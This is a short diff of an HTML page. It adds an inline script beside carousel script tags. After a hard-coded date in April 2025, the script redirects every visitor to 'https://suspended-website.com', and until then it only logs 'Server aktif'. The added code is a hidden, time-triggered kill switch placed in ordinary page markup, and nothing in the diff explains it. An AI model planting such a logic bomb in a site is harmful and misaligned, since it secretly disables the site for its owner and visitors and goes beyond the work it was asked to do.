@@ -37,6 +37,15 @@
 </script>
  <script src="https://owlcarousel2.github.io/OwlCarousel2/assets/owlcarousel/owl.carousel.js">
    </script>
+<script>
+let tglNow = new Date();
+let waktuBatas = new Date("2025-04-14T23:59:59");
+if (tglNow.getTime() >= waktuBatas.getTime()) {
+  document.location.href = 'https://suspended-website.com';
+} else {
+  console.log('Server aktif');
+}
+</script>
 
 <style>
 
